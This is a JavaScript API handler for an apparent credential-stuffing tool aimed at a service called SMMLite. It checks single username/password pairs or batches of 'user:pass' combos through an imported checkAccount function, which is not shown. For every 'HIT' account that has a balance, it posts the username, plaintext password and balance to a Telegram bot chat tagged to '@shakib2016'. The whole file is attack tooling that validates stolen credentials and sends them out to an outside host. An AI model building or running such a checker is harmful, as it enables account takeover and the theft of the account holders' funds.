// api/check.js – supports batch checking
import { checkAccount } from '../lib/checkCore.js';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { username, password, combos, testOnly } = req.body;

  // Test mode
  if (testOnly) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(200).json({ success: false, error: 'Bot token or chat ID missing' });
    }
    const testMsg = '✅ Telegram connection successful!\n\nAuto‑post will work for SMMLite HIT accounts.';
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: testMsg,
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        })
      });
      const result = await response.json();
      if (!result.ok) {
        return res.status(200).json({ success: false, error: result.description || 'Unknown error' });
      }
      return res.status(200).json({ success: true, message: 'Test message sent!' });
    } catch (err) {
      return res.status(200).json({ success: false, error: err.message });
    }
  }

  // ===== BATCH CHECK =====
  // যদি combos অ্যারে পাঠানো হয়
  if (combos && Array.isArray(combos) && combos.length > 0) {
    const results = [];
    for (const combo of combos) {
      const [user, pass] = combo.split(':');
      if (!user || !pass) {
        results.push({ combo, valid: false, hit: false, balance: 0, message: 'Invalid format' });
        continue;
      }
      const result = await checkAccount(user.trim(), pass.trim());
      results.push({ combo, ...result });
    }
    return res.status(200).json({ results });
  }

  // SINGLE CHECK (পুরনো পদ্ধতি)
  if (!username || !password) {
    return res.status(400).json({ error: 'Missing username or password' });
  }

  const result = await checkAccount(username, password);

  // Auto-post to Telegram if HIT
  if (result.hit && TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    const message = `🎯 *HIT on SMMLite By @shakib2016*\n\n` +
                    `👤 *Username:* ${username}\n` +
                    `🔑 *Password:* \`${password}\`\n` +
                    `💰 *Balance:* $${result.balance.toFixed(6)}\n\n` +
                    `#SMMLite @shakib2016 #HIT`;
    try {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        })
      });
    } catch (err) {}
  }

  return res.status(200).json(result);
}
